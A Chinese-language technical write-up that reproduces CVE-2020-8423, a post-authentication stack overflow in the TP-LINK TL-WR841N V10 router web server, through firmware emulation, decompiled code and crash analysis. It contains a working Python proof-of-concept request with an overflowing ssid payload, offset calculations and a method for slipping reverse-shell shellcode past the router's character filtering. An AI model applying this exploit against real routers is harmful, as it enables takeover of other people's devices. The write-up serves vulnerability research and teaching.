# TPLINK WR841N 路由器栈溢出漏洞分析

## 0x00 简介

前段时间 TP-LINK TL-WR841N 设备爆出了一个认证后的栈溢出漏洞，借机复现了一下这个栈溢出漏洞，其中有一些在漏洞利用上的小技巧在此和大家分享一下。

漏洞信息如下：

> 漏洞编号：CVE-2020-8423
>
> 漏洞设备：TP-LINK TL-WR841N V10
>
> 漏洞效果：登陆过路由器web服务admin账户之后可以获取到路由器的shell。
>
> 漏洞描述：httpd获取参数时的栈溢出导致了覆盖返回地址shellcode执行

受影响设备以及版本信息：

```
cpe：2.3：o：tp-link：tl-wr841n_firmware：3.16.9：*：*：*：*：*：*：*
cpe：2.3：h：tp-link：tl-wr841n：v10：*：*：*：*：*：*：*
```
## 0x01 环境搭建

1. 下载固件：[https://www.tp-link.com/no/support/download/tl-wr841n/v10/](https://www.tp-link.com/no/support/download/tl-wr841n/v10/)

2. `binwalk -Me xxx.bin`命令对固件进行解压。

   - 关于一些依赖环境的搭建和网络配置可以参考下面的链接： [https://blog.csdn.net/qq_38204481/article/details/105391866](https://blog.csdn.net/qq_38204481/article/details/105391866)

3. 为了成功运行环境，必须hook 一些关键函数。编译hook函数，hook掉httpd文件里面的阻塞函数。
  

参考文章中，实际上只需要hook 掉fork和system函数：

   ```
   #include <stdio.h>
   #include <stdlib.h>
   
   
   int system(const char *command){
       printf("HOOK: system(\"%s\")",command);
       return 1337;
   }
   
   
   int fork(void){
       return 1337;
   }
   ```

编译：

   ```bash
   mips-linux-gnu-gcc -shared -fPIC hook_mips.c -o hook_mips
   ```

4. 运行 qemu 环境

   启动 qemu 虚拟机之后，在里面运行，便成功启动调试环境。

   ```bash
   mount --bind /proc squashfs-root/proc
   chroot . bin/sh
   
   LD_PRELOAD="/hook" /usr/bin/httpd
   或者
   export LD_PRELOAD="/hook"
   ./gdbserver 0.0.0.0:2333  /usr/bin/httpd
   ```

   - 这里可能会出现一些报错：如没有 libc.so.6 或者 没有ld.so.1，解决方法是需要创建 lib 目录下对应的软连接，`ln -s ld-uClibc-0.9.30.so ld.so.1`，如图

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408190632763.png)

     

     搭建成功之后访问IP地址即可

     如果是远程，没有界面可以使用ssh端口转发
     [https://blog.csdn.net/qq_38204481/article/details/105113896](https://blog.csdn.net/qq_38204481/article/details/105113896)

## 0x02 漏洞分析

得到文件系统之后，在 `/usr/bin/httpd` 二进制文件中，找到了这个函数：

```c
int stringModify(char *dest, int len, int src)

{
       char src_index;
       char *src_index_a_1;
       int index;
       if ((dest == (char *)0x0) || (src_index_a_1 = (char *)(src + 1), src == 0)) 
{
              index = -1;
       }

       else {
              index = 0;
              while (true) {
                     src_index = src_index_a_1[-1];
                    
                     if ((src_index == '\0') || (len <= index)) break;/* src为空或当index等于长度时结束 */
                     if (src_index == '/') {   //处理 /  
                     LAB_0043bb48:
                           *dest = '\\';
                     LAB_0043bb4c:
                           index = index + 1;
                           dest = dest + 1;/*  /添加转义字符，变为\/ */
                     LAB_0043bb54:
                           *dest = src_index_a_1[-1];
                           dest = dest + 1;
                     }
                     else {                     //处理其他字符
                           if ('/' < src_index) {//左斜杠为2F小于0的ascii  （处理数字和字母）
                                  if ((src_index == '>') || (src_index == '\\')) 
goto LAB_0043bb48;
                                  if (src_index == '<') {

                                         *dest = '\\';
                                         goto LAB_0043bb4c;  //>，<，\\变为  
\>>,\<<,\//
                                  }
                                  goto LAB_0043bb54;
                           }  //下面是ascii小于x2f的字符

                           if (src_index != '\r') {//\r的ascii为DH                       （处理\r,\",\n）
                                  if (src_index == '\"') goto LAB_0043bb48;//22h

                                  if (src_index != '\n') goto LAB_0043bb54;//AH
                           }

                           if ((*src_index_a_1 != '\r') && (*src_index_a_1 != 
'\n')) {//处理前一个为\r或\n  后一个不是\r或\n 的组合字符  
                                  *dest = '<';    // <br>
                                  dest[1] = 'b';
                                  dest[2] = 'r';
                                  dest[3] = '>';
                                  dest = dest + 4;
                           }
                     }   //else结束
                     index = index + 1;//index表示已经拷贝的长度（包含转义字符\）
                     src_index_a_1 = src_index_a_1 + 1;
              }
              *dest = '\0';
       }
       return index;
}
```

```c
int stringModify(char *dst,size_t size,char *src)
```
通过分析这个函数，我们可以知道这个函数是用来转义/过滤一些特殊字符，函数处理的整个过程为：

1 . 对`\，/，<，>，"`这些符号进行转义
2 . 把单独的\r或者\n（单独是指后面没有跟\r或者\n）
3 . 差不多相当于字符串拷贝，只是拷贝的同时对一些字符进行了处理
4 . 原本一个字节的\n会被转义成四个字节的\<br> 很容易dst设置大小不够造成溢出



通过函数交叉引用进行回溯，可以找到 `writePageParamSet` 函数，这是它的一个调用者，设置dst缓冲区太小造成溢出。

```c
void writePageParamSet(int param_1,char *param_2,int **param_3,undefined4 param_4)

{
  int iVar1;
  int *piVar2;
  char local_210 [512];
  
  if (param_3 == (int **)0x0) {
    param_4 = 0xb2;
    HTTP_DEBUG_PRINT();
  }
  iVar1 = strcmp(param_2,"\"%s\",");
  if (iVar1 == 0) {
    iVar1 = stringModify(local_210,0x200,(int)param_3);
    if (iVar1 < 0) {
      printf("string modify error!");
      local_210[0] = '\0';
    }
    piVar2 = (int *)local_210;
  }
  else {
    iVar1 = strcmp(param_2,"%d,");
    if (iVar1 != 0) {
      return;
    }
    piVar2 = *param_3;
  }
  httpPrintf(param_1,param_2,piVar2,param_4);
  return;
}
```

继续往前回溯，找到 `0x0457574`地址处的函数，这个函数获取get请求的一些参数，调用了漏洞函数：
```c

int UndefinedFunction_00457574(int param_1,undefined4 param_2,int *param_3,undefined4 param_4)

{
    __s_00 = (char *)httpGetEnv(param_1,"ssid");
    if (__s_00 == (char *)0x0) {
      uStack3080 = 0;
    }
    else {
      __n = strlen(__s_00);
      strncpy((char *)&uStack3080,__s_00,__n);
    }
    __s_00 = (char *)httpGetEnv(param_1,"curRegion");
    if (__s_00 == (char *)0x0) {
      piStack3044 = (int *)0x11;
    }
    else {
      __s = (int *)atoi(__s_00);
      if (__s < (int *)0x6c) {
        piStack3044 = __s;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"channel");
    if (__s_00 == (char *)0x0) {
      piStack3040 = (int *)0x6;
    }
    else {
      __s = (int *)atoi(__s_00);
      if ((int)__s - 1U < 0xf) {
        piStack3040 = __s;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"chanWidth");
    if (__s_00 == (char *)0x0) {
      piStack3036 = (int *)0x2;
    }
    else {
      __s = (int *)atoi(__s_00);
      if ((int)__s - 1U < 3) {
        piStack3036 = __s;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"mode");
    if (__s_00 == (char *)0x0) {
      piStack3032 = (int *)0x1;
    }
    else {
      __s = (int *)atoi(__s_00);
      if ((int)__s - 1U < 7) {
        piStack3032 = __s;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"wrr");
    if (__s_00 != (char *)0x0) {
      iVar1 = strcmp(__s_00,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(__s_00), iVar1 == 1)) {
        piStack3028 = (int *)0x1;
      }
      else {
        piStack3028 = (int *)0x0;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"sb");
    if (__s_00 != (char *)0x0) {
      iVar1 = strcmp(__s_00,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(__s_00), iVar1 == 1)) {
        piStack3024 = (int *)0x1;
      }
      else {
        piStack3024 = (int *)0x0;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"select");
    if (__s_00 != (char *)0x0) {
      iVar1 = strcmp(__s_00,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(__s_00), iVar1 == 1)) {
        piStack3020 = (int *)0x1;
      }
      else {
        piStack3020 = (int *)0x0;
      }
    }
    __s_00 = (char *)httpGetEnv(param_1,"rate");
    if (__s_00 != (char *)0x0) {
      iStack3016 = atoi(__s_00);
    }
    httpPrintf(param_1,
               "<SCRIPT language=\"javascript\" type=\"text/javascript\">\nvar %s = new Array(\n",
               (int *)"pagePara",uVar11);
    writePageParamSet(param_1,"\"%s\",",&uStack3080,0);
    writePageParamSet(param_1,"%d,",&piStack3044,1);
    writePageParamSet(param_1,"%d,",&piStack3040,2);
    writePageParamSet(param_1,"%d,",&piStack3036,3);
    writePageParamSet(param_1,"%d,",&piStack3032,4);
    writePageParamSet(param_1,"%d,",&piStack3028,5);
    writePageParamSet(param_1,"%d,",&piStack3024,6);
    writePageParamSet(param_1,"%d,",&piStack3020,7);
    __s = &iStack3016;
    uVar12 = 8;
    writePageParamSet(param_1,0x548278);
    httpPrintf(param_1,"0,0 );\n</SCRIPT>\n",__s,uVar12);
    httpPrintf(param_1,"<script language=JavaScript>\nvar isInScanning = 0;\n</script>",__s,uVar12);
    uVar9 = 0;
    HttpWebV4Head(param_1,0,0,uVar12);
    __s_00 = "/userRpm/WzdWlanSiteSurveyRpm_AP.htm";
  }
```

## 0x03 漏洞验证

写了一个 poc 来验证一下：

```python
import requests
import socket
import socks
import urllib
SOCKS5_PROXY_HOST = '127.0.0.1' # socks 代 理 IP地 址 是 用 ssh -D进 行 端 口 转 发 ， 需 要 设 置
代 理
SOCKS5_PROXY_PORT = 9999 # socks 代 理 本 地 端 口

default_socket = socket.socket
socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
socket.socket = socks.socksocket
session = requests.Session()
session.verify = False

def exp(path,cookie):
		headers = {
      	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
				"Cookie":"Authorization=Basic{cookie}".format(cookie=str(cookie))}

    payload="/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"

		params = {
        "mode":"1000",
				"curRegion":"1000",
				"chanWidth":"100",
				"channel":"1000",
				"ssid":urllib.request.unquote(payload)
		}
    url="http://172.17.221.20:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm".for	mat(path=str(path))


		
    resp = session.get(url,params=params,headers=headers,timeout=10)
		print (resp.text)

exp("TFDTDFTCUJPCWNEB","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
```
使用 wireshark 抓包，查看发送的数据包，也可以使用 burp 抓包：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413110020662.png)

- 注意这里的 ssid 里的内容需要加上 `unquote` 函数对 %0A 先进行解码，因为 python requests 发送数据包时会默认对参数值进行编码。

结果会发现远程路由器服务崩溃，gdbserver 抛出了 SIGSEGV 的栈溢出信号。

![](http://static.zybuluo.com/H4l0/hhqhr7osmb3zrcm6rcv6dgav/image.png)

## 0x04 漏洞利用

### 使用 mipsrop 插件查找 ROP

崩溃之后，查看上下文环境，查看 pc 寄存器的值确定偏移：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413110250233.png)

```

$t6 : 0x61636661 ("afca"?)   (a*218+t6)
$t7 : 0x0
$s0 : 0x61616261 ("abaa"?)，实际上是大端，应该是aaba（a*2+s0）
$s1 : 0x61616361 ("acaa"?) (a*6+s1)
$s2 : 0x61616461 ("adaa"?)
$s3 : 0x5
$s4 : 0x0
$s5 : 0x7
$s6 : 0x0
$s7 : 0x0064d6bc → 0x0064e7f4 → 0x000a0003
$t8 : 0x2
$t9 : 0x77faf980 → 0x3c1c0002
$k0 : 0x0
$k1 : 0x0
$s8 : 0x7d7fedf8 → "abwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaac[...]"
$pc : 0x61616561 ("aeaa"?)
$sp : 0x7d7fed50 → "aafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa[...]"
$hi : 0x36c67
$lo : 0x6338ceeb
$fir : 0x739300
$ra : 0x61616561 ("aeaa"?)
$gp : 0x00594d80 → 0x00000000
```
计算得出偏移：

```c
sp的偏移为 "/%0A"*0x55+ "a"*2+"aaaa"*4

payload="/%0A"*0x55+“a”*2
payload+=s0
payload+=s1
payload+=s2
payload+=pc,ra
```

```bash
gef➤ vmmap
[ Legend: Code | Heap | Stack ]
Start End Offset Perm Path
0x00400000 0x00561000 0x00000000 r-x /usr/bin/httpd
0x00571000 0x00590000 0x00161000 rw- /usr/bin/httpd
0x00590000 0x0066e000 0x00000000 rwx [heap]
0x77e05000 0x77e46000 0x00000000 rw-
0x77e46000 0x77ea3000 0x00000000 r-x /lib/libuClibc-0.9.30.so
0x77ea3000 0x77eb2000 0x00000000 ---
0x77eb2000 0x77eb3000 0x0005c000 r-- /lib/libuClibc-0.9.30.so
0x77eb3000 0x77eb4000 0x0005d000 rw- /lib/libuClibc-0.9.30.so
0x77eb4000 0x77eb9000 0x00000000 rw-
0x77eb9000 0x77ee3000 0x00000000 r-x /lib/libgcc_s.so.1
0x77ee3000 0x77ef3000 0x00000000 ---
0x77ef3000 0x77ef4000 0x0002a000 rw- /lib/libgcc_s.so.1
0x77ef4000 0x77ef6000 0x00000000 r-x /lib/libwpa_ctrl.so
0x77ef6000 0x77f05000 0x00000000 ---
0x77f05000 0x77f06000 0x00001000 rw- /lib/libwpa_ctrl.so
0x77f06000 0x77f07000 0x00000000 r-x /lib/libutil.so.0
0x77f07000 0x77f16000 0x00000000 ---
0x77f16000 0x77f17000 0x00000000 rw- /lib/libutil.so.0
0x77f17000 0x77f18000 0x00000000 r-x /lib/libmsglog.so
0x77f18000 0x77f27000 0x00000000 ---
0x77f27000 0x77f28000 0x00000000 rw- /lib/libmsglog.so
0x77f28000 0x77f29000 0x00000000 r-x /lib/librt.so.0
0x77f29000 0x77f38000 0x00000000 ---
0x77f38000 0x77f39000 0x00000000 rw- /lib/librt.so.0
0x77f39000 0x77f96000 0x00000000 r-x /lib/libc.so.0
0x77f96000 0x77fa5000 0x00000000 ---
0x77fa5000 0x77fa6000 0x0005c000 r-- /lib/libc.so.0
0x77fa6000 0x77fa7000 0x0005d000 rw- /lib/libc.so.0
0x77fa7000 0x77fac000 0x00000000 rw-
0x77fac000 0x77fb9000 0x00000000 r-x /lib/libpthread.so.0
0x77fb9000 0x77fc8000 0x00000000 ---
0x77fc8000 0x77fc9000 0x0000c000 r-- /lib/libpthread.so.0
0x77fc9000 0x77fce000 0x0000d000 rw- /lib/libpthread.so.0
0x77fce000 0x77fd0000 0x00000000 rw-
0x77fd0000 0x77fd1000 0x00000000 r-x /hook_mips
0x77fd1000 0x77fe0000 0x00000000 ---
0x77fe0000 0x77fe1000 0x00000000 r-- /hook_mips
0x77fe1000 0x77fe2000 0x00001000 rw- /hook_mips
0x77fe2000 0x77fe7000 0x00000000 r-x /lib/ld-uClibc.so.0
0x77ff1000 0x77ff5000 0x00000000 rw- /SYSV0000002f (deleted)
0x77ff5000 0x77ff6000 0x00000000 rw-
0x77ff6000 0x77ff7000 0x00004000 r-- /lib/ld-uClibc.so.0
0x77ff7000 0x77ff8000 0x00005000 rw- /lib/ld-uClibc.so.0
0x7d7fd000 0x7d800000 0x00000000 rwx
0x7d9fd000 0x7da00000 0x00000000 rwx
0x7dbfd000 0x7dc00000 0x00000000 rwx
0x7ddfd000 0x7de00000 0x00000000 rwx
0x7dffd000 0x7e000000 0x00000000 rwx
0x7e1fd000 0x7e200000 0x00000000 rwx
0x7e3fd000 0x7e400000 0x00000000 rwx
0x7e5fd000 0x7e600000 0x00000000 rwx
0x7e7fd000 0x7e800000 0x00000000 rwx
0x7e9fd000 0x7ea00000 0x00000000 rwx
0x7ebfd000 0x7ec00000 0x00000000 rwx
0x7edfd000 0x7ee00000 0x00000000 rwx
0x7effd000 0x7f000000 0x00000000 rwx
0x7f1fd000 0x7f200000 0x00000000 rwx
0x7f3fd000 0x7f400000 0x00000000 rwx
0x7f5fd000 0x7f600000 0x00000000 rwx
0x7f7fd000 0x7f800000 0x00000000 rwx
0x7ffd6000 0x7fff7000 0x00000000 rwx [stack]
0x7fff7000 0x7fff8000 0x00000000 r-x [vdso]
```
在 gdb 调试器中找到libc的基地址，这里主要使用libc.so库来查找rop。

- 关于 ROP 链的构造，网上的文章也比较多了，在此不在赘述，这里可以主要参考[这篇文章](https://www.anquanke.com/post/id/179510)

总结起来就是一张图：

![](http://static.zybuluo.com/H4l0/9aqefz9pm94i2skjf0r27rpr/image.png)

模拟器内核可能开启了ALSR，方便演示先关闭保护机制：

```c
sudo sh -c "echo '0' > /proc/sys/kernel/randomize_va_space"
```
### shellcode 查找/构造

贴出两个查找shellcode网站

http://shell-storm.org/shellcode/files/shellcode-794.php
[https://www.exploit-db.com/exploits/45541](https://www.exploit-db.com/exploits/45541)

直接使用现成的反弹 shell 的 shellcode 发现行不通，原因是程序中对数据有过滤，需要对shellcode修改。

- 对 shellcode 的修改方法主要有两种：

1、同指令替换。
2、进行简单编码。

这里采用指令替换的方法，针对于 `lui` 指令的字节码为 0x3c（/）的情况下，使用一些无关指令，如填充`ori t3,t3,0xff3c`指令时，3c 会被编码成 5c3c，那么这时候3c就逃逸到下一个内存空间中，这个 3c 就可以继续使用了（针对于开头为 3c 的汇编指令）。

过程总结如下：

```c
1. 选择一个无用的寄存器 t3，填充 ori $t3, $t3, 0xff3c。对应的汇编字节码为 "\x35\x6b\xff\x3c"
2. 结尾的 \x3c 会转义为 \x5c\x3c，\x3c 就会逃逸到下一个内存空间中
3. 在下一个内存空间中，如果我们需要填充 "\ x3c \ x0f \ x2f \ x2f" //lui $ t7, 0x2f2f  这个语句的话，只需填充 \ x0f \ x2f \ x2f 即可，这样我们就达到了类似指令替换的目的
4. 对于其他被转义的字符也可以类似的操作。
```
- 对指令进行反汇编时，可以借助 pwntools 的 disasm 模块

```python
from pwn import *
disasm("\x01\xe0\x20\x27",arch="mips",endian="big",bytes=32)
```
这样我们将 shellcode 进行简单的修改之后，就可以成功获取路由器的权限。


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413134753757.png)

- 视频参考：

https://twitter.com/H4looo/status/1248924966256427011

## 参考文章

[https://ktln2.org/2020/03/29/exploiting-mips-router/](https://ktln2.org/2020/03/29/exploiting-mips-router/)
